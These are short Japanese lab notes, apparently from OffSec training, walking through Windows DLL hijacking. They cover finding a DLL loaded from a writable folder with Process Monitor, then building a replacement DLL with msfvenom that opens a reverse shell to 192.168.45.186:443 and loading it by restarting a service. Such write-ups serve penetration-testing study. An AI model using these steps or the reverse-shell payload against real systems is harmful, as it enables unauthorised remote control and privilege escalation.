サービスとして登録するsc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe"

ProcessMonitorを一度立ち上げ、キャプチャを停止（Ctrl＋E）し画面をクリア（Ctrl＋ｘ）する

フィルタを画像のように設定し、キャプチャを再開（Ctrl＋E）する

![[DLLハイジャッキング image.png]]

サービスを再起動する

Restart-Service Scheduler

![[DLLハイジャッキング image 1.png]]

一般的でないかつ書き込み可能な場所で読み込もうとしているdllを探す

![[DLLハイジャッキング image 2.png]]

最終的な絞り込み後

C:\Users\offsec\Desktop\beyondhelper.dll

同じフォルダ内から読み込む

dllの準備

msfvenom -p windows/x64/shell_reverse_tcp -f dll -o beyondhelper.dll LHOST=192.168.45.186 LPORT=443

![[DLLハイジャッキング image 3.png]]

INTRANETのSchedulerに作成したbeyondhelper.dllを蔵置

![[DLLハイジャッキング image 4.png]]

サービスを再起動させ、dllを読み込ませる

![[DLLハイジャッキング image 5.png]]

![[DLLハイジャッキング image 6.png]]